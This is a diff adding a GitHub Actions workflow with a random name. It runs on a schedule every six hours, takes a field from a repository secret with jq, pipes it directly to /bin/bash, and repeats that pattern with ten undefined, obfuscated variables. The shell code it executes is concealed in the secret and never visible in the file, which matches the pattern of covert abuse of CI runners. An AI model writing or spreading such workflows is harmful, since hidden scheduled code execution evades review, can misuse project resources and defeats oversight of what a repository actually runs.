@@ -1,0 +1,27 @@
+name: huamaoxin1289
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huamaoxin1289
+        env:
+          tb8: ${{ secrets.tb8 }}
+        run: |
+          echo $tb8 | jq -r .tyb924 | /bin/bash
+          echo $jaho4 | jq -r .pstf9258 | /bin/bash
+          echo $dicc47059 | jq -r .ll54 | /bin/bash
+          echo $pel1165 | jq -r .j71 | /bin/bash
+          echo $abixy24766 | jq -r .y3422 | /bin/bash
+          echo $rxfs52 | jq -r .fgu570 | /bin/bash
+          echo $osfv2 | jq -r .aca95 | /bin/bash
+          echo $wnaq94362 | jq -r .paj3 | /bin/bash
+          echo $clxh0597 | jq -r .dosu37881 | /bin/bash
+          echo $n1761 | jq -r .bq180 | /bin/bash
+          echo $bhkwz6881 | jq -r .f3432 | /bin/bash
+
